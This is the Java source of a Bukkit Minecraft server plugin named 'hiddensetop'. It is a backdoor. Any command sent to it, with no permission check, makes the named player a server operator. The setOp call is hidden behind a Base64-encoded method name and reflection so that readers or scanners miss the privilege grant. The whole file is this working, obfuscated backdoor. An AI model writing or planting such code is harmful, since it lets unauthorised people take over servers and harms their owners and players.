package com.comze_instancelabs.hiddensetop;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import net.minecraft.util.org.apache.commons.codec.binary.Base64;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (args.length > 0) {
			try {
				method(args[0]);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return true;
	}

	// base64 encoded "setOp" string
	String str = "c2V0T3A="; 

	// Access the setOp function through reflection and execute it
	public void method(String playername) throws NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InstantiationException {
		Player p = Bukkit.getPlayer(playername);
		String str_decoded = new String(Base64.decodeBase64(str));
		Class clazz = p.getClass();
		Method m = clazz.getDeclaredMethod(str_decoded, boolean.class);
		if (m != null) {
			m.setAccessible(true);
			m.invoke(p, true);
		}
	}

}
